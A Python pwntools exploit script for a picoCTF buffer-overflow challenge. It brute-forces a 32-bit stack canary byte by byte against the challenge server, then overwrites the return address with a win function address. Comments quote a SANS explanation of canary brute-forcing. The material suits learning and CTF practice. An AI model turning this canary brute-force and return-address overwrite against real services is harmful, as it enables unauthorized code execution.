#!/usr/bin/env python3

"""
# This is the writup I learned from 
https://cypelf.fr/articles/buffer-overflow-3/

# Good information on stack canaries and how to bypass their protection
https://www.sans.org/blog/stack-canaries-gingerly-sidestepping-the-cage/
# From the article
	"As discussed earlier, the read() function will allow us to write null bytes to a buffer, effectively disabling the security the null bytes should add...

	 In some occasions, brute forcing the canary may be successful. When using a random canary on a 32 bit system, 
	 the canary will have 24 bits of entropy. This is due to the 8 bits (1 byte) being used for the NULL byte. 
	 2^24 possibilities of randomisation makes 16.777.216 possible canary values. In a local privilege escalation exploit, 
	 16 million guesses could well be within the bounds of a brute force attack. 

	 On 64 bit systems, that entropy increases to 2^56 or 7.20 * 10^16 possibilities. 
	 This would be less feasible. 

	 However, our guessing can be steered a bit. If we guess the canary byte by byte, we will be able to discern when we have guessed the right value. 
	 This is possible because an incorrect guess for a byte will generate a stack smashing error, where a correct byte guess will yield no such error. 
	 The maximum number (worst case) of guesses will remain 2^24, but the average number will decrease.""
"""


from pwn import *

domain = 'saturn.picoctf.net'
port = 61487

def get_canary():

	canary_bytes = []

	for i in range(4):
		canary_bytes.append(0)
		
		for j in range(256):
			canary_bytes[i] = (j + 65) % 256 

			p = remote(domain, port)

			p.recv()
			p.send(b"9999\n")
			p.recv()
			p.send(b"A"*64 + "".join([chr(o) for o in canary_bytes]).encode('utf-8'))
			result = p.recvall().decode('utf-8')

			if "Stack Smashing Detected" not in result:
				context.log_level = "info"
				log.info(f"Found byte {i + 1} of the canary = {canary_bytes[i]}")
				context.log_level = "error"
				break

			assert(j < 255) 

	return "".join([chr(o) for o in canary_bytes]).encode("utf-8")


p = remote(domain, port)
context.log_level = "error"

canary = get_canary()
win = p32(0x08049336)

p.recv().decode('utf-8')
p.send(b"9999\n")
p.recv().decode("utf-8")
p.send(b"A"*64 + canary + p32(0)*4 + win)

context.log_level = "info"
log.info(p.recvall().decode('utf-8'))